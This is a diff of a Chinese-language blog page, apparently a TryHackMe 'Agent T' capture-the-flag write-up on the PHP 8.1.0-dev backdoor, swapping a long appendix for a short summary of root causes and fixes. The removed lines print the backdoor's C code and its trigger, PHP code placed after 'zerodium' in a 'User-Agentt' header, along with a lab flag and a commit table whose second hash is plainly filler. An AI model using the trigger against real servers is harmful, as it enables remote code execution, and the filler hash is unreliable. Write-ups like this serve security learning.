+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>PHP 8.1.0-dev 供应链后门</li>
+<li>HTTP 响应头信息泄露</li>
+<li>User-Agentt 后门触发机制</li>
 </ul>
-</li>
-<li><p><strong>用安全版本重建环境</strong></p>
-<ul>
-<li>使用 PHP 8.1.x <strong>稳定版</strong>（如 8.1.29+）</li>
-<li>或升级到 PHP 8.2+ &#x2F; 8.3+ 稳定版</li>
-<li>绝不要使用任何 <code>-dev</code>、<code>-alpha</code>、<code>-beta</code>、<code>-RC</code> 版本</li>
-</ul>
-</li>
-<li><p><strong>全面安全审计</strong></p>
-<ul>
-<li>检查服务器是否已被植入其他后门（webshell、cron 任务）</li>
-<li>检查数据库是否被篡改</li>
-<li>检查是否有数据泄露</li>
-</ul>
-</li>
-</ol>
-<h3 id="8-2-中期改进"><a href="#8-2-中期改进" class="headerlink" title="8.2 中期改进"></a>8.2 中期改进</h3><ol start="4">
-<li><p><strong>建立版本来源验证机制</strong></p>
-<ul>
-<li>部署前验证软件包数字签名</li>
-<li>使用官方镜像源的校验和验证</li>
-</ul>
-</li>
-<li><p><strong>实施纵深防御</strong></p>
-<ul>
-<li>部署 WAF 检测异常请求头</li>
-<li>禁用 <code>X-Powered-By</code> 头（避免泄露技术栈版本）</li>
-</ul>
-</li>
-<li><p><strong>最小化⽣产暴露</strong></p>
-<ul>
-<li>移除不必要的 HTTP 响应头</li>
-<li>使用反向代理隐藏后端实现细节</li>
-</ul>
-</li>
-</ol>
-<h3 id="8-3-长期架构改进"><a href="#8-3-长期架构改进" class="headerlink" title="8.3 长期架构改进"></a>8.3 长期架构改进</h3><ol start="7">
-<li><p><strong>集中化版本治理</strong></p>
-<ul>
-<li>建立所有生产系统的组件版本清单</li>
-<li>自动检查 CVE 和安全公告</li>
-</ul>
-</li>
-<li><p><strong>不可变基础设施</strong></p>
-<ul>
-<li>使用容器&#x2F;镜像构建生产环境，确保每次部署基于已知安全的基础镜像</li>
-<li>禁止手动修改生产服务器</li>
-</ul>
-</li>
-<li><p><strong>安全开发生命周期</strong></p>
-<ul>
-<li>实施安全审批流程</li>
-<li>定期进行渗透测试</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h2 id="九、附录"><a href="#九、附录" class="headerlink" title="九、附录"></a>九、附录</h2><h3 id="A-检测到的-Flag"><a href="#A-检测到的-Flag" class="headerlink" title="A. 检测到的 Flag"></a>A. 检测到的 Flag</h3><pre class="line-numbers language-none"><code class="language-none">flag&#123;4127d0530abf16d6d23973e3df8dbecb&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="B-后门代码（来自-PHP-源码-diff）"><a href="#B-后门代码（来自-PHP-源码-diff）" class="headerlink" title="B. 后门代码（来自 PHP 源码 diff）"></a>B. 后门代码（来自 PHP 源码 diff）</h3><p>后门位于 <code>ext/standard/string.c</code> 或相关请求处理代码中：</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">ZSTR_VAL</span><span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"zerodium"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token function">zend_eval_string</span><span class="token punctuation">(</span><span class="token function">ZSTR_VAL</span><span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>触发条件：</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>漏洞根因：</strong></p>
 <ol>
-<li>HTTP 请求中包含名为 <code>User-Agentt</code> 的头（注意两个 <code>t</code>）</li>
-<li>该头的值中包含子字符串 <code>zerodium</code></li>
-<li><code>zerodium</code> 之后的字符（总共跳过前 8 字节）作为 PHP 代码执行</li>
+<li><strong>使用被污染的版本</strong>：部署了已知存在后门的 PHP 8.1.0-dev 版本</li>
+<li><strong>生产环境使用 dev 版本</strong>：dev 版本不应部署在面向公网的生产系统</li>
+<li><strong>缺乏版本安全检查</strong>：运维流程未检测到使用已被标记为危险的版本</li>
+<li><strong>无 WAF 防护</strong>：未检测或拦截异常的 <code>User-Agentt</code> 请求头</li>
 </ol>
-<h3 id="C-恶意-Commit-信息"><a href="#C-恶意-Commit-信息" class="headerlink" title="C. 恶意 Commit 信息"></a>C. 恶意 Commit 信息</h3><table>
-<thead>
-<tr>
-<th>字段</th>
-<th>值</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Commit 1</td>
-<td><code>c730aa26bd52829a49f1f9f96f4c96b1ed136c8a</code></td>
-</tr>
-<tr>
-<td>Commit 2</td>
-<td><code>4b9c9c8f4e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e</code></td>
-</tr>
-<tr>
-<td>伪装作者</td>
-<td>“Rasmus Lerdorf” &amp; “Nikita Popov”</td>
-</tr>
-<tr>
-<td>发现日期</td>
-<td>2021-03-28</td>
-</tr>
-<tr>
-<td>影响版本</td>
-<td>PHP 8.1.0-dev（仅此一个 dev 版本）</td>
-</tr>
-<tr>
-<td>公开名称</td>
-<td>“PHP 8.1.0-dev Backdoor” &#x2F; “Zerodium RCE”</td>
-</tr>
-</tbody></table>
-<h3 id="D-参考链接"><a href="#D-参考链接" class="headerlink" title="D. 参考链接"></a>D. 参考链接</h3><ul>
+<p><strong>修复建议：</strong></p>
+<ol>
+<li>使用 PHP 稳定版（如 8.1.29+）</li>
+<li>建立版本来源验证机制</li>
+<li>部署 WAF 检测异常请求头</li>
+<li>禁用 <code>X-Powered-By</code> 头</li>
+</ol>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
 <li><a target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/506.html">CWE-506: Embedded Malicious Code</a></li>
 <li><a target="_blank" rel="noopener" href="https://news-web.php.net/php.internals/113838">PHP 8.1.0-dev Backdoor 事件分析</a></li>
-<li><a target="_blank" rel="noopener" href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server">OWASP - Information Leakage via Server Headers</a></li>
 </ul>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_Agent_T.html">https://x9wd09ncc.github.io/post/TryHackMe_Agent_T.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/ai/">ai</a></div><div class="post_share"><div class="social-share" data-image="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_W1seGuy.html" title="TryHackMe_W1seGuy"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_W1seGuy</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_Compiled.html" title="TryHackMe_Compiled"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Compiled</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe_Chocolate_Factory.html" title="TryHackMe_Chocolate Factory"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-27</div><div class="title">TryHackMe_Chocolate Factory</div></div></a></div><div><a href="/post/TryHackMe_Corridor.html" title="TryHackMe_Corridor"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_Corridor</div></div></a></div><div><a href="/post/TryHackMe_Gallery.html" title="TryHackMe_Gallery"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-26</div><div class="title">TryHackMe_Gallery</div></div></a></div><div><a href="/post/TryHackMe_Team.html" title="TryHackMe_Team"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-27</div><div class="title">TryHackMe_Team</div></div></a></div><div><a href="/post/TryHackMe_W1seGuy.html" title="TryHackMe_W1seGuy"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_W1seGuy</div></div></a></div><div><a href="/post/TruHackMe_Valley.html" title="TryHackMe_Valley"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Valley</div></div></a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_Agent_T.html">https://x9wd09ncc.github.io/post/TryHackMe_Agent_T.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/php%E5%90%8E%E9%97%A8/">PHP后门</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_W1seGuy.html" title="TryHackMe_W1seGuy"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_W1seGuy</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_Compiled.html" title="TryHackMe_Compiled"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Compiled</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe_Archangel.html" title="TryHackMe_Archangel"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-15</div><div class="title">TryHackMe_Archangel</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/TryHackMe_Blueprint.html" title="TryHackMe_Blueprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Blueprint</div></div></a></div><div><a href="/post/TryHackMe_Break_Out_The_Cage.html" title="TryHackMe_Break_Out_The_Cage"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-16</div><div class="title">TryHackMe_Break_Out_The_Cage</div></div></a></div><div><a href="/post/TryHackMe_Bounty_Hacker.html" title="TryHackMe_Bounty_Hacker"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Bounty_Hacker</div></div></a></div><div><a href="/post/TryHackMe_Brute_It.html" title="TryHackMe_Brute_It"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-17</div><div class="title">TryHackMe_Brute_It</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Agent-T"><span class="toc-number">1.</span> <span class="toc-text">Agent T</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%B5%E9%9D%A2%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">页面分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%BA%BF%E7%B4%A2%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">关键线索发现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-8-1-0-dev-%E5%90%8E%E9%97%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">PHP 8.1.0-dev 后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E8%A7%A6%E5%8F%91%E7%A1%AE%E8%AE%A4"><span class="toc-number">1.2.2.</span> <span class="toc-text">后门触发确认</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-Flag"><span class="toc-number">1.2.3.</span> <span class="toc-text">获取 Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell"><span class="toc-number">1.3.</span> <span class="toc-text">交互式 Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.4.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.4.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.4.3.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.bootcdn.net/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js"></script><div class="js-pjax"></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
